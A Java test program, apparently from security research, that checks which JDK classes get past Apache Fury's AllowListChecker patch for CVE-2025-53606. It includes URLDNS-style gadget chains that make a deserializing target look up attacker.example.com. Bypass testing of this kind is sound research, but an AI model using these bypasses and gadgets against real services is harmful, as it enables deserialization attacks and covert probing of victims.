/**
 * CVE-2025-53606 Bypass Enumeration
 *
 * Tests which classes bypass the AllowListChecker despite not being
 * in the explicit whitelist. The hypothesis is that Fury pre-registers
 * built-in serializers during initialization, and these pre-registered
 * classes bypass the ClassChecker because they're already in the
 * internal class cache when xreadClass() is called.
 *
 * This tests a comprehensive list of potentially interesting types.
 */

import org.apache.fury.Fury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;
import org.apache.fury.resolver.AllowListChecker;

import java.io.*;
import java.lang.reflect.*;
import java.math.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

public class BypassEnumeration {

    private static Fury createPatchedFury() {
        Fury f = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();

        AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
        f.getClassResolver().setClassChecker(checker);

        Set<String> allowPatterns = new HashSet<>();
        allowPatterns.add("java.lang.Boolean");
        allowPatterns.add("java.lang.Byte");
        allowPatterns.add("java.lang.Character");
        allowPatterns.add("java.lang.Double");
        allowPatterns.add("java.lang.Float");
        allowPatterns.add("java.lang.Integer");
        allowPatterns.add("java.lang.Long");
        allowPatterns.add("java.lang.Short");
        allowPatterns.add("java.lang.Number");
        allowPatterns.add("java.lang.Class");
        allowPatterns.add("java.lang.String");
        allowPatterns.add("java.util.ArrayList");
        allowPatterns.add("java.util.LinkedList");
        allowPatterns.add("java.util.HashSet");
        allowPatterns.add("java.util.LinkedHashSet");
        allowPatterns.add("java.util.TreeSet");
        allowPatterns.add("java.util.HashMap");
        allowPatterns.add("java.util.LinkedHashMap");
        allowPatterns.add("java.util.TreeMap");
        allowPatterns.add("org.apache.seata.*");
        allowPatterns.add("org.apache.seata.core.exception.TransactionExceptionCode");
        allowPatterns.add("org.apache.seata.core.model.BranchStatus");
        allowPatterns.add("org.apache.seata.core.model.BranchType");
        allowPatterns.add("org.apache.seata.core.model.GlobalStatus");
        allowPatterns.add("org.apache.seata.core.protocol.ResultCode");

        checker.allowClasses(allowPatterns);
        return f;
    }

    private static Fury createAttackerFury() {
        return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
    }

    private static boolean testClass(String name, Object obj) {
        try {
            Fury attacker = createAttackerFury();
            Fury patched = createPatchedFury();
            byte[] serialized = attacker.serialize(obj);
            Object result = patched.deserialize(serialized);
            System.out.println("[BYPASS] " + name + " (" + obj.getClass().getName() + ") => " + result);
            return true;
        } catch (Exception e) {
            String msg = e.getMessage() != null ? e.getMessage() : e.getClass().getName();
            if (msg.contains("isn't in allow list") || msg.contains("is forbidden")) {
                System.out.println("[BLOCKED] " + name + " (" + obj.getClass().getName() + ")");
            } else {
                System.out.println("[ERROR]   " + name + " (" + obj.getClass().getName() + "): " + msg.substring(0, Math.min(msg.length(), 120)));
            }
            return false;
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("========================================================================");
        System.out.println("CVE-2025-53606 AllowListChecker Bypass Enumeration");
        System.out.println("========================================================================");

        List<String> bypassed = new ArrayList<>();

        System.out.println("\n--- Primitive wrappers and related ---");
        if (testClass("AtomicInteger", new AtomicInteger(42))) bypassed.add("AtomicInteger");
        if (testClass("AtomicLong", new AtomicLong(42L))) bypassed.add("AtomicLong");
        if (testClass("AtomicBoolean", new AtomicBoolean(true))) bypassed.add("AtomicBoolean");
        if (testClass("BigDecimal", new BigDecimal("3.14"))) bypassed.add("BigDecimal");
        if (testClass("BigInteger", new BigInteger("12345"))) bypassed.add("BigInteger");
        if (testClass("StringBuilder", new StringBuilder("test"))) bypassed.add("StringBuilder");
        if (testClass("StringBuffer", new StringBuffer("test"))) bypassed.add("StringBuffer");

        System.out.println("\n--- Date/Time types ---");
        if (testClass("Date", new Date())) bypassed.add("Date");
        if (testClass("java.sql.Date", new java.sql.Date(System.currentTimeMillis()))) bypassed.add("java.sql.Date");
        if (testClass("Timestamp", new java.sql.Timestamp(System.currentTimeMillis()))) bypassed.add("Timestamp");
        if (testClass("Calendar", Calendar.getInstance())) bypassed.add("Calendar");
        if (testClass("TimeZone", TimeZone.getDefault())) bypassed.add("TimeZone");
        if (testClass("Locale", Locale.US)) bypassed.add("Locale");
        if (testClass("Currency", Currency.getInstance("USD"))) bypassed.add("Currency");

        System.out.println("\n--- Collection/Map types ---");
        if (testClass("Vector", new Vector<>())) bypassed.add("Vector");
        if (testClass("Stack", new Stack<>())) bypassed.add("Stack");
        if (testClass("Hashtable", new Hashtable<>())) bypassed.add("Hashtable");
        if (testClass("ConcurrentHashMap", new ConcurrentHashMap<>())) bypassed.add("ConcurrentHashMap");
        if (testClass("Properties", new Properties())) bypassed.add("Properties");
        if (testClass("ArrayDeque", new ArrayDeque<>())) bypassed.add("ArrayDeque");
        if (testClass("PriorityQueue", new PriorityQueue<>())) bypassed.add("PriorityQueue");
        if (testClass("BitSet", new BitSet(8))) bypassed.add("BitSet");
        if (testClass("EnumMap", new EnumMap<>(Thread.State.class))) bypassed.add("EnumMap");
        if (testClass("EnumSet", EnumSet.of(Thread.State.NEW))) bypassed.add("EnumSet");

        System.out.println("\n--- Collections utility wrappers ---");
        if (testClass("EmptyList", Collections.emptyList())) bypassed.add("EmptyList");
        if (testClass("EmptyMap", Collections.emptyMap())) bypassed.add("EmptyMap");
        if (testClass("EmptySet", Collections.emptySet())) bypassed.add("EmptySet");
        if (testClass("SingletonList", Collections.singletonList("a"))) bypassed.add("SingletonList");
        if (testClass("SingletonMap", Collections.singletonMap("k", "v"))) bypassed.add("SingletonMap");
        if (testClass("UnmodifiableList", Collections.unmodifiableList(new ArrayList<>()))) bypassed.add("UnmodifiableList");
        if (testClass("UnmodifiableMap", Collections.unmodifiableMap(new HashMap<>()))) bypassed.add("UnmodifiableMap");
        if (testClass("SynchronizedList", Collections.synchronizedList(new ArrayList<>()))) bypassed.add("SynchronizedList");

        System.out.println("\n--- IO types ---");
        if (testClass("File", new File("/etc/passwd"))) bypassed.add("File");
        if (testClass("URI", new URI("http://attacker.com"))) bypassed.add("URI");

        System.out.println("\n--- Potentially dangerous types ---");
        // These could be useful in gadget chains
        try {
            if (testClass("URL", new URL("http://attacker.com"))) bypassed.add("URL");
        } catch (Exception e) {}
        if (testClass("UUID", UUID.randomUUID())) bypassed.add("UUID");
        if (testClass("Optional-empty", Optional.empty())) bypassed.add("Optional-empty");
        if (testClass("Pattern", java.util.regex.Pattern.compile(".*"))) bypassed.add("Pattern");

        System.out.println("\n--- Concurrency types ---");
        if (testClass("AtomicReference-String", new AtomicReference<>("test"))) bypassed.add("AtomicReference");
        if (testClass("AtomicIntegerArray", new AtomicIntegerArray(new int[]{1,2,3}))) bypassed.add("AtomicIntegerArray");
        if (testClass("AtomicLongArray", new AtomicLongArray(new long[]{1,2,3}))) bypassed.add("AtomicLongArray");
        if (testClass("CountDownLatch", new CountDownLatch(1))) bypassed.add("CountDownLatch");

        System.out.println("\n--- Array types ---");
        if (testClass("int[]", new int[]{1,2,3})) bypassed.add("int[]");
        if (testClass("byte[]", new byte[]{1,2,3})) bypassed.add("byte[]");
        if (testClass("String[]", new String[]{"a","b"})) bypassed.add("String[]");
        if (testClass("Object[]", new Object[]{"a", 1})) bypassed.add("Object[]");
        if (testClass("Integer[]", new Integer[]{1,2})) bypassed.add("Integer[]");
        if (testClass("boolean[]", new boolean[]{true,false})) bypassed.add("boolean[]");

        System.out.println("\n--- Nesting bypass: HashMap<String, AtomicReference<URL>> ---");
        try {
            URL url = new URL("http://attacker.example.com/bypass");
            Field hf = URL.class.getDeclaredField("hashCode");
            hf.setAccessible(true);
            hf.set(url, -1);
            AtomicReference<URL> ref = new AtomicReference<>(url);
            HashMap<String, AtomicReference<URL>> chainMap = new HashMap<>();
            chainMap.put("exploit", ref);
            if (testClass("HashMap<String,AtomicReference<URL>>", chainMap)) bypassed.add("AtomicReference<URL> chain");
        } catch (Exception e) {
            System.out.println("[ERROR] Chain setup: " + e);
        }

        System.out.println("\n--- Nesting bypass: HashMap<AtomicReference<URL>, String> ---");
        try {
            URL url = new URL("http://attacker.example.com/bypass2");
            Field hf = URL.class.getDeclaredField("hashCode");
            hf.setAccessible(true);
            hf.set(url, -1);
            AtomicReference<URL> ref = new AtomicReference<>(url);
            HashMap<AtomicReference<URL>, String> chainMap2 = new HashMap<>();
            chainMap2.put(ref, "exploit");
            if (testClass("HashMap<AtomicReference<URL>,String>", chainMap2)) bypassed.add("AtomicReference<URL> as key");
        } catch (Exception e) {
            System.out.println("[ERROR] Chain setup: " + e);
        }

        System.out.println("\n========================================================================");
        System.out.println("SUMMARY: " + bypassed.size() + " classes BYPASSED the AllowListChecker:");
        for (String name : bypassed) {
            System.out.println("  - " + name);
        }
        System.out.println("========================================================================");
    }
}
